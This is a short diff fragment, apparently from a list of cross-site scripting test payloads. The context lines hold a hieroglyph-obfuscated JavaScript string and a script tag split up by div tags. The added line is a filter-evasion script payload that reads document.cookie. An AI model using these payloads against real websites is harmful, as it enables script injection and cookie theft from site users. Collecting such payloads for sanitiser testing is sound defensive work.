@@ -16,3 +16,4 @@
 𓇎]+𓂀[𓏢]+𓊝+𓆣+'`𓅂 𓏢 𓂀 𓁄 𓆣 𓊝 𓇎`')``
 
 <</div>script</div>>alert()<</div>/script</div>>
+<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
